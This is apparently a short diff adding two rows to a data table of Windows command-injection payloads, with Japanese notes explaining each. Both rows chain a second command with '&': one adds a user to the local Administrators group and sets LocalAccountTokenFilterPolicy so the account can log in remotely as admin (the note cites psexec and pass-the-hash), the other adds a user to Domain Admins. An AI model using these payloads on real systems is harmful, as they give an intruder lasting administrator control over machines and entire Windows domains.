@@ -1,0 +1,2 @@
+& net localgroup Administrators <new_user> /add & reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f	端末の管理者	Administrators に入れる。LocalAccountTokenFilterPolicy で、外からも管理者で入れる（psexec・PtH）
+/domain & net group ""Domain Admins"" <new_user> /add /domain	ドメインの管理者	Domain Admins に入れる（ドメインの端末で。"" は PowerShell の中の "）
